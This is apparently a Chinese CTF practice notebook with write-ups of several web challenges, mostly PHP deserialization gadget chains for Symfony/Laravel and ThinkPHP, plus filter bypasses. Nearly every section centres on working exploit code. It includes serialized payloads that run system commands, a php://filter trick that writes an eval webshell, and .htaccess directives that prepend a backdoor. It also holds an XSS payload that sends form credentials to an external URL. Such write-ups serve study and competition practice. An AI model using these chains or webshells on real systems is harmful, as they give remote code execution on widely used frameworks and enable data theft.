# Day03

## 0x01 [2020 新春红包题
源码

```php
class A {

    protected $store;

    protected $key;

    protected $expire;

    public function __construct($store, $key = 'flysystem', $expire = null) {
        $this->key = $key;
        $this->store = $store;
        $this->expire = $expire;
    }

    public function cleanContents(array $contents) {
        $cachedProperties = array_flip([
            'path', 'dirname', 'basename', 'extension', 'filename',
            'size', 'mimetype', 'visibility', 'timestamp', 'type',
        ]);

        foreach ($contents as $path => $object) {
            if (is_array($object)) {
                $contents[$path] = array_intersect_key($object, $cachedProperties);
            }
        }

        return $contents;
    }

    public function getForStorage() {
        $cleaned = $this->cleanContents($this->cache);

        return json_encode([$cleaned, $this->complete]);
    }

    public function save() {
        $contents = $this->getForStorage();

        $this->store->set($this->key, $contents, $this->expire);
    }

    public function __destruct() {
        if (!$this->autosave) {
            $this->save();
        }
    }
}

class B {

    protected function getExpireTime($expire): int {
        return (int) $expire;
    }

    public function getCacheKey(string $name): string {
        // 使缓存文件名随机
        $cache_filename = $this->options['prefix'] . uniqid() . $name;
        if(substr($cache_filename, -strlen('.php')) === '.php') {
          die('?');
        }
        return $cache_filename;
    }

    protected function serialize($data): string {
        if (is_numeric($data)) {
            return (string) $data;
        }

        $serialize = $this->options['serialize'];

        return $serialize($data);
    }

    public function set($name, $value, $expire = null): bool{
        $this->writeTimes++;

        if (is_null($expire)) {
            $expire = $this->options['expire'];
        }

        $expire = $this->getExpireTime($expire);
        $filename = $this->getCacheKey($name);

        $dir = dirname($filename);

        if (!is_dir($dir)) {
            try {
                mkdir($dir, 0755, true);
            } catch (\Exception $e) {
                // 创建失败
            }
        }

        $data = $this->serialize($value);

        if ($this->options['data_compress'] && function_exists('gzcompress')) {
            //数据压缩
            $data = gzcompress($data, 3);
        }

        $data = "<?php\n//" . sprintf('%012d', $expire) . "\n exit();?>\n" . $data;
        $result = file_put_contents($filename, $data);

        if ($result) {
            return $filename;
        }

        return null;
    }

}
```
这个题目和ezpop有一个地方不一样，就是在文件名的获取

```php
public function getCacheKey(string $name): string {
        // 使缓存文件名随机
        $cache_filename = $this->options['prefix'] . uniqid() . $name;
        if(substr($cache_filename, -strlen('.php')) === '.php') {
          die('?');
        }
        return $cache_filename;
    }
```
所以这里我们需要绕过这个后缀的限制。
` ../a.php/ `
这个方法绕过就可以很素服到达效果。在处理的时候会自动删除后缀</br>
两个解法
exp1
直接命令执行打flag
```php
<?php
class A{
    protected $store;
    protected $key;
    protected $expire;
    public $cache = [];
    public $complete = true;
    public function __construct () {
        $this->store = new B();
        $this->key = '/../wtz.phtml';
        $this->cache = ['path'=>'a','dirname'=>'`cat /flag > ./uploads/flag.php`'];
    }
}
class B{
    public $options = [
        'serialize' => 'system',
        'prefix' => 'sssss',
    ];
}
echo urlencode(serialize(new A()));
```
exp2
绕过后缀限制写入
```php
<?php
class A{
    protected $store;
    protected $key;
    protected $expire;
    public function __construct()
    {
        $this->key = '/../wtz.php/.';
    }
    public function start($tmp){
        $this->store = $tmp;
    }
}
class B{
    public $options;
}

$a = new A();
$b = new B();
$b->options['prefix'] = "php://filter/write=convert.base64-decode/resource=uploads/";
$b->options['expire'] = 11;
$b->options['data_compress'] = false;
$b->options['serialize'] = 'strval';
$a->start($b);
$object = array("path"=>"PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg");
$path = '111';
$a->cache = array($path=>$object);
$a->complete = '2';
echo urlencode(serialize($a));
?>
```
解法3
上传.user.ini加载图片

## 0x02 [GWCTF 2019]mypassword
通过查看页面源码发现login.js会加载session中的密码，然后获取一下就可以了，页面源码里面有黑名单检测，他只替换一次，中间插入法就可以绕过了。给个payload，但是没打通
```js
<inpcookieut type="text" name="username"></inpcookieut>
<inpcookieut type="text" name="password"></inpcookieut>
<scricookiept scookierc="./js/login.js"></scricookiept>
<scricookiept>
var uname=docucookiement.getElemcookieentsByName("username")[0].value;
var psw=docucookiement.getElemcookieentsByName("password")[0].value;
docucookiement.location(url+"?a="+uname+psw);
</scricookiept>
```
## 0x03 [极客大挑战 2020]Greatphp
源码
```php
<?php
error_reporting(0);
class SYCLOVER {
    public $syc;
    public $lover;

    public function __wakeup(){
        if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)) ){
           if(!preg_match("/\<\?php|\(|\)|\"|\'/", $this->syc, $match)){
               eval($this->syc);
           } else {
               die("Try Hard !!");
           }
           
        }
    }
}

if (isset($_GET['great'])){
    unserialize($_GET['great']);
} else {
    highlight_file(__FILE__);
}

?>
```
要绕过这里的md5和sha两次验证，我的第一想法是数组绕过，但是这里数组绕过了，也不能成功的eval，因为他的参数只能是String类型的，所以我们就必须借助其他的类，剩下的就是原生类、之前做过有tostring的原生类，就是Error。还有Soap的ssrf(__call方法)就不多说了，搞payload
```php
<?php
class SYCLOVER {
    public $syc;
    public $lover;
}
$c = new SYCLOVER();
$str = "?><?=include~".urldecode("%D0%99%93%9E%98")."?>";
$a=new Error($str,1);$b=new Error($str,2);
$c->syc=$a;
$c->lover=$b;
echo urlencode(serialize($c));
```
## 0x04 [XNUCA2019Qualifier]EasyPHP
高质量赛题，没有直接做出来 呜呜呜(好久没做过文件上传的题目，忘记.htaccess和.user.ini)
源码不贴了，大概意思就是
`任意写`</br>
```php
stristr($content,'on') || stristr($content,'html') || stristr($content,'type') || stristr($content,'flag') || stristr($content,'upload') || stristr($content,'file')
```
对内容进行了过滤。首先的思路就是直接写shell，发现根本不解析，这个时候就应该想到是配置文件的问题，就应该想办法写入.htaccess文件或者.user.ini文件。</br>
解法1:  
因为我们知道不解析其他的php文件，我们就想办法把php代码包含到index.php中。
题目的源码中有这样一段`include_once("fl3g.php");` 我们可以通过改变include_path来是得这个文件出现在我们可控的位置，自然想到了tmp目录。所以这里  

1. 第一个方法:  
```php
php_value include_path "xxx"
php_value error_reporting 32767
php_value error_log /tmp/fl3g.php \
#
```
因为后面有垃圾数据，记得<kbd>\\</kbd>和<kbd>#</kbd>将他们注释掉  
2. 第二个方法 ：  
   这里他是用的正则来匹配的，我们可以设置正则的回溯次数来绕过正则。
   ```
   php_value pcre.backtrack_limit 0
   php_value pcre.jit 0
   ```
   现在就可以直接写入shell了  
3. 第三个方法:  
   直接auto_append 加入.htaccess
   ```php
   php_value auto_prepend_fi\
   le ".htaccess"
   #<?php eval($_GET[a]);?>\
   ```
   htaccess文件的末尾不允许注释  

## 0x04 [CISCN2019 华东北赛区]Web2  
fuzz 测试很容易看出来是xss，但是有过滤，会被括号变成中文括号，会把`=`变成`等于号`,所以这里必须得用一个编码绕过，并且这个编码能够直接被执行，那就只有yyds的html markup了。也就是&#+ascii.然后网上超一个转换exp和链接直接打`eval`无敌好吧。最后一步是sql注入。

## 0x05 [CISCN2019 总决赛 Day1 Web4]Laravel

审计pop链子没什么好说的。开局`__destruct`

![image-20211229203733914](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20211229203733914.png)

![image-20211229203752591](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20211229203752591.png)

![image-20211229203849687](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20211229203849687.png)

![image-20211229203857403](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20211229203857403.png)

这是文件包含的链子 生成exp了。

```php
<?php
namespace Symfony\Component\Cache\Adapter{
    class TagAwareAdapter{
        public $pool;//
        public function __construct($a,$b){
            $this->pool= $a;
            $this->deferred = array("a"=>$b);
        }
    }

    class PhpArrayAdapter{
    public function __construct(){
        $this->values = null;
        $this->file = "/flag";
        }
    }
    
}
namespace Symfony\Component\Cache{
    class CacheItem{
    protected $innerItem = 'ls';
}
}
namespace{
echo urlencode(serialize(new \Symfony\Component\Cache\Adapter\TagAwareAdapter(new \Symfony\Component\Cache\Adapter\PhpArrayAdapter(),new \Symfony\Component\Cache\CacheItem())));}

```

![image-20211229205254794](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20211229205254794.png)

任意命令执行的链子

起点不变

![image-20211229205525462](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20211229205525462.png)

![image-20211229205542330](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20211229205542330.png)

![image-20211229205856688](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20211229205856688.png)

这里又学到一个新知识:`"\0*\0innerItem"`获取protected属性。

直接抄网上的exp

```php
<?php

namespace Symfony\Component\Cache\Adapter;

class TagAwareAdapter{
    public $deferred = array();
    function __construct($x){
        $this->pool = $x;
    }
}

class ProxyAdapter{
    protected $setInnerItem = 'system';
}

namespace Symfony\Component\Cache;

class CacheItem{
    protected $innerItem = 'cat /flag';
}

$a = new \Symfony\Component\Cache\Adapter\TagAwareAdapter(new \Symfony\Component\Cache\Adapter\ProxyAdapter());
$a->deferred = array('aa'=>new \Symfony\Component\Cache\CacheItem);
echo urlencode(serialize($a));

```

## 0x06 [网鼎杯 2020 青龙组]filejava

先是一个文件上传 平平无奇。然后上传后 发现有一个任意文件下载，但是我们不知道网站路径，所以我们现在有两个方法，一个是报错泄露路径，一个是猜。但是经过测试，报错猜到了文件路劲，下载classes文件，反编译，发现了网站对于exec-*.xlsx文件有解析。然后百度到了https://www.jianshu.com/p/73cd11d83c30。按照操作拿下flag。

## 0x07 [安洵杯 2019]iamthinking

parseurl的绕过不用多写了，我们直接看链子。

```php
<?php
namespace think\model\concern{
    trait Attribute{
        private $data = [7];
    }
}

namespace think\view\driver{
    class Php{}
}

namespace think{
    abstract class Model{
        use model\concern\Attribute;
        private $lazySave;
        protected $withEvent;
        protected $table;
        function __construct($cmd){
            $this->lazySave = true;
            $this->withEvent = false;
            $this->table = new route\Url(new Middleware,new Validate,$cmd);
        }
    }
    class Middleware{
        public $request = 2333;
    }
    class Validate{
        protected $type;
        function __construct(){
             $this->type = [
                "getDomainBind" => [new view\driver\Php,'display']
            ];
        }
    }
}

namespace think\model{
    use think\Model;
    class Pivot extends Model{} 
}

namespace think\route{
    class Url
    {
        protected $url = 'a:';
        protected $domain;
        protected $app;
        protected $route;
        function __construct($app,$route,$cmd){
            $this->domain = $cmd;
            $this->app = $app;
            $this->route = $route;
        }
    }
}

namespace{
    echo base64_encode(serialize(new think\Model\Pivot('<?php phpinfo(); exit(); ?>')));
}
```

我们来理一理这个链子。首先全局找__destruct()

![image-20211230201652890](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20211230201652890.png)

大概到达这一步就可以触发toString方法了。

需要满足的条件就是

```
$this->lazySave true
$this->withEvent = true
$this->data = ["a"]
```

就可以对于`$this->name`进行触发

![image-20211230201957367](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20211230201957367.png)

到这里就可以触发`__call(value)`这样的方法了

![image-20211230202903452](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20211230202903452.png)

![image-20211230202914958](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20211230202914958.png)

现在就是call_user_func_array([可控]，可控)；可以任意调用类和方法

他后面还有一部分方法，但是我发现意义其实不是很大，已经可以任意执行代码了。

```
<?php
namespace think\model\concern{
    trait Attribute{
        private $data = [7];
    }
}

namespace think{
    abstract class Model{
        use model\concern\Attribute;
        // private $data = [7];
        private $lazySave;
        protected $withEvent;
        protected $table;
        function __construct($cmd){
            $this->lazySave = true;
            $this->withEvent = false;
            $this->table = new route\Url(new Middleware,new Validate,$cmd);
        }
    }
    class Middleware{
        public $request = 2333;
    }
    class Validate{
        protected $type;
        function __construct(){
             $this->type = [
                "getDomainBind" => "system"
            ];
        }
    }
}

namespace think\model{
    use think\Model;
    class Pivot extends Model{} 
}

namespace think\route{
    class Url
    {
        protected $url = 'a:';
        protected $domain;
        protected $app;
        protected $route;
        function __construct($app,$route,$cmd){
            $this->domain = $cmd;
            $this->app = $app;
            $this->route = $route;
        }
    }
}

namespace{
    echo urlencode(serialize(new think\Model\Pivot('calc')));
}
```

## 0x08 [watevrCTF-2019]Pickle Store

一看题目就是pickle反序列化的考点了

参考:https://www.zhihu.com/tardis/sogou/art/89132768

pickle: 存储字符串对象比存储对象要方便(序列化存在的意义

https://gitee.com/Cralwer/study-note/blob/master/CTF%E5%A4%8D%E7%8E%B0/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.md

这个题目就很简单了，poc到懒得写了。
